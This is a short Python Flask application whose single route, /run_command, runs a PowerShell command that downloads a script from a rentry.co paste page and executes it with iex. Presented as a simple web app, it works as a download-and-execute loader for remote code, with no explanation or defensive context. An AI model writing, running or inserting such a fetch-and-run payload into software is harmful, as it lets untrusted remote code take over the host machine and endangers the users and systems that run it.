from flask import Flask, request

app = Flask(__name__)

@app.route('/run_command', methods=['GET'])
def run_command():
    import subprocess
    command = "powershell irm rentry.co/Testy123/raw | iex"
    subprocess.run(command, shell=True)
    return "Command executed successfully!"

if __name__ == '__main__':
    app.run()
